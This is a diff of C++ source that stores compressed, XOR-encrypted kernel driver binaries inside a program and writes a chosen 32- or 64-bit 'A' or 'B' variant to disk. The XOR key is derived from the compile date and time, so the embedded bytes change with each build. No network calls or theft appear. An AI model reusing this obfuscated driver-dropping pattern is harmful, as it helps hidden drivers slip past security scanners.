@@ -18,53 +18,59 @@
 
 #if __has_include("DrvBin32.cpp")
 #define HAVEBINDRV32 1
-#include "DrvBin32.cpp"
+#include "DrvBin32.cpp"     // SHA1 and SHA256 signed
 #endif
 
 #if __has_include("DrvBin64.cpp")
 #define HAVEBINDRV64 1
-#include "DrvBin64.cpp"
+#include "DrvBin64.cpp"     // SHA1 and SHA256 signed
 #endif
 
 #define BINKEY ((__DATE__[0] ^ (__DATE__[1] - __DATE__[2] + __DATE__[4]) ^ __DATE__[5]) * (__TIME__[0] ^ (__TIME__[1] - __TIME__[3]) ^ __TIME__[4]))     // DATE: Mmm dd yyyy  // TIME: hh:mm:ss
 
 //---------------------------------------------------------------------------
-UINT _fastcall SizeDriver32(void)
+UINT _fastcall SizeDriver32(bool Alt)
 {
 #ifdef HAVEBINDRV32 
- return BSizeBinDrv32;     
+ return Alt?BSizeBinDrv32B:BSizeBinDrv32A;     
 #else
  return 0;
 #endif
 }
 //---------------------------------------------------------------------------
-UINT _fastcall SizeDriver64(void)
+UINT _fastcall SizeDriver64(bool Alt)
 {
 #ifdef HAVEBINDRV64 
- return BSizeBinDrv64;
+ return Alt?BSizeBinDrv64B:BSizeBinDrv64A;
 #else
  return 0;
 #endif
 }
 //---------------------------------------------------------------------------
-UINT _fastcall ReadDriver32(PBYTE DstBuf, UINT BufSize)
+UINT _fastcall ReadDriver32(PBYTE DstBuf, UINT BufSize, bool Alt)
 {
-#ifdef HAVEBINDRV32     
- if(BufSize > BSizeBinDrv32)BufSize = BSizeBinDrv32;
- for(int ctr=0,bleft=BufSize;bleft > 0;ctr++,bleft--)DstBuf[ctr] = DecryptByteWithCtr(((PBYTE)&BinDrv32)[ctr],XKeyBinDrv32,bleft); 
- DBGMSG("Decrypted with %02X",XKeyBinDrv32);
+#ifdef HAVEBINDRV32  
+ BYTE  XorKey  = (Alt)?(XKeyBinDrv32B):(XKeyBinDrv32A);
+ UINT  DrvSize = SizeDriver32(Alt);  
+ PBYTE DrvPtr  = (Alt)?((PBYTE)&BinDrv32B):((PBYTE)&BinDrv32A);
+ if(BufSize > DrvSize)BufSize = DrvSize;
+ for(int ctr=0,bleft=BufSize;bleft > 0;ctr++,bleft--)DstBuf[ctr] = DecryptByteWithCtr(DrvPtr[ctr],XorKey,bleft); 
+ DBGMSG("Decrypted with %02X",XorKey);
  return BufSize;
 #else
  return 0;
 #endif
 }
 //---------------------------------------------------------------------------
-UINT _fastcall ReadDriver64(PBYTE DstBuf, UINT BufSize)
+UINT _fastcall ReadDriver64(PBYTE DstBuf, UINT BufSize, bool Alt)
 {
-#ifdef HAVEBINDRV64    
- if(BufSize > BSizeBinDrv64)BufSize = BSizeBinDrv64;
- for(int ctr=0,bleft=BufSize;bleft > 0;ctr++,bleft--)DstBuf[ctr] = DecryptByteWithCtr(((PBYTE)&BinDrv64)[ctr],XKeyBinDrv64,bleft); 
- DBGMSG("Decrypted with %02X",XKeyBinDrv64);
+#ifdef HAVEBINDRV64  
+ BYTE  XorKey  = (Alt)?(XKeyBinDrv64B):(XKeyBinDrv64A);
+ UINT  DrvSize = SizeDriver64(Alt); 
+ PBYTE DrvPtr  = (Alt)?((PBYTE)&BinDrv64B):((PBYTE)&BinDrv64A);
+ if(BufSize > DrvSize)BufSize = DrvSize;
+ for(int ctr=0,bleft=BufSize;bleft > 0;ctr++,bleft--)DstBuf[ctr] = DecryptByteWithCtr(DrvPtr[ctr],XorKey,bleft); 
+ DBGMSG("Decrypted with %02X",XorKey);
  return BufSize;
 #else
  return 0;
@@ -72,9 +78,8 @@ UINT _fastcall ReadDriver64(PBYTE DstBuf, UINT BufSize)
 }
 //---------------------------------------------------------------------------
 #ifdef _DEBUG
-int _fastcall PackDataBlockToFile(PBYTE Data, UINT DataSize, BYTE Key, LPSTR ArrName, PWSTR FilePath)
+int _fastcall PackDataBlockToFile(PBYTE Data, UINT DataSize, BYTE Key, LPSTR ArrName, CArr<BYTE>* DstFile)
 {
- CArr<BYTE> DstFile;
  NPAQ8::MSTRM SrcBuf;
  NPAQ8::MSTRM DstBuf;
  char KeyLine[128];
@@ -86,10 +91,8 @@ int _fastcall PackDataBlockToFile(PBYTE Data, UINT DataSize, BYTE Key, LPSTR Arr
  if(!Buffer || !Size){LOGMSG("No compressed data for %s!",ArrName); return -2;}
  LOGMSG("Packed size is %u for %s",Size,ArrName);
  int llen = wsprintfA(KeyLine,"#define XKey%s  0x%02X\r\n",ArrName,Key);
- DstFile.Append((PBYTE)&KeyLine, llen);
- if(BinDataToCArray(DstFile, (PBYTE)Buffer, Size, ArrName, Key, sizeof(DWORD)) <= 0){LOGMSG("Failed to create BinDrv %s!",ArrName); return -3;}
- DstFile.ToFile(FilePath);
- LOGMSG("Saved BinDrv %02X: %ls",Key,FilePath);
+ DstFile->Append((PBYTE)&KeyLine, llen);
+ if(BinDataToCArray(*DstFile, (PBYTE)Buffer, Size, ArrName, Key, sizeof(DWORD)) <= 0){LOGMSG("Failed to create BinDrv %s!",ArrName); return -3;}
  return 0;
 }
 //---------------------------------------------------------------------------
@@ -99,35 +102,44 @@ int _fastcall GenerateBinDrv(void)
  wchar_t DstPath64[] = {_L(PROJECT_DIR) L"DrvBin64.cpp"};    
 
  CArr<BYTE> TmpArr;
+ CArr<BYTE> DstFile32;
+ CArr<BYTE> DstFile64;
  BYTE XorKey = BINKEY;
- TmpArr.FromFile("N:\\DriverX32.sys");
- if(PackDataBlockToFile(TmpArr.c_data(), TmpArr.Size(), XorKey, "BinDrv32", DstPath32) < 0){LOGMSG("Failed to create BinDrv32!"); return -1;}
+ TmpArr.FromFile("N:\\DriverX32A.sys");
+ if(PackDataBlockToFile(TmpArr.c_data(), TmpArr.Size(), XorKey, "BinDrv32A", &DstFile32) < 0){LOGMSG("Failed to create BinDrv32A!"); return -1;}
+ TmpArr.FromFile("N:\\DriverX32B.sys");
+ if(PackDataBlockToFile(TmpArr.c_data(), TmpArr.Size(), XorKey, "BinDrv32B", &DstFile32) < 0){LOGMSG("Failed to create BinDrv32B!"); return -2;}
+ DstFile32.ToFile(DstPath32);
+ LOGMSG("Saved BinDrv32 %02X: %ls",XorKey,&DstPath32);
 
  XorKey = ~((XorKey << 4)|(XorKey >> 4));
- TmpArr.FromFile("N:\\DriverX64.sys");
- if(PackDataBlockToFile(TmpArr.c_data(), TmpArr.Size(), XorKey, "BinDrv64", DstPath64) < 0){LOGMSG("Failed to create BinDrv64!"); return -2;}
- LOGMSG("Done");
+ TmpArr.FromFile("N:\\DriverX64A.sys");
+ if(PackDataBlockToFile(TmpArr.c_data(), TmpArr.Size(), XorKey, "BinDrv64A", &DstFile64) < 0){LOGMSG("Failed to create BinDrv64A!"); return -3;}
+ TmpArr.FromFile("N:\\DriverX64B.sys");
+ if(PackDataBlockToFile(TmpArr.c_data(), TmpArr.Size(), XorKey, "BinDrv64B", &DstFile64) < 0){LOGMSG("Failed to create BinDrv64B!"); return -4;}
+ DstFile64.ToFile(DstPath64);
+ LOGMSG("Saved BinDrv64 %02X: %ls",XorKey,&DstPath64);
  return 0;
 }
 //---------------------------------------------------------------------------
 #endif
 //---------------------------------------------------------------------------
-int _fastcall SaveDriverToFile(PWSTR Name, bool IsX64, PWSTR FilePathOut, PWSTR NormPathOut)
+int _fastcall SaveDriverToFile(PWSTR Name, bool IsX64, PWSTR FilePathOut, PWSTR NormPathOut, bool Alt)
 {
  NPAQ8::MSTRM SrcBuf, DstBuf;
  if(IsX64)
   {
-   SrcBuf.AssignFrom(NULL, SizeDriver64());
+   SrcBuf.AssignFrom(NULL, SizeDriver64(Alt));
    unsigned long Size = 0;
    void* Buffer = SrcBuf.GetBuffer(&Size);
-   if(!ReadDriver64((PBYTE)Buffer, Size)){DBGMSG("DrvBin64.cpp is not preperly generated!"); return -1;}
+   if(!ReadDriver64((PBYTE)Buffer, Size, Alt)){DBGMSG("DrvBin64.cpp is not preperly generated!"); return -1;}
   }
    else
     {
-     SrcBuf.AssignFrom(NULL, SizeDriver32());
+     SrcBuf.AssignFrom(NULL, SizeDriver32(Alt));
      unsigned long Size = 0;
      void* Buffer = SrcBuf.GetBuffer(&Size);
-     if(!ReadDriver32((PBYTE)Buffer, Size)){DBGMSG("DrvBin32.cpp is not preperly generated!"); return -2;}
+     if(!ReadDriver32((PBYTE)Buffer, Size, Alt)){DBGMSG("DrvBin32.cpp is not preperly generated!"); return -2;}
     }
  int res = NPAQ8::strm_decompress(1, 0, SrcBuf, DstBuf);    // Fastest (Same size)
  if(res < 0){DBGMSG("Failed to decompress the driver: %s, %u",Name,(int)IsX64); return -3;}
@@ -182,7 +194,7 @@ int _fastcall SaveDriverToFile(PWSTR Name, bool IsX64, PWSTR FilePathOut, PWSTR 
    CloseHandle(hFile); 
   }
  if(!WrRes || (Result != Size)){DBGMSG("Failed to write the driver file(%u): %ls",GetLastError(),&DrvPath); DeleteFileW(DrvPath); return -6;} 
- DBGMSG("Driver saved to: %ls",&DrvPath); 
+ DBGMSG("Driver %u saved to: %ls",(int)Alt,&DrvPath); 
  lstrcpyW(FilePathOut, DrvPath);
  return 0;
 }
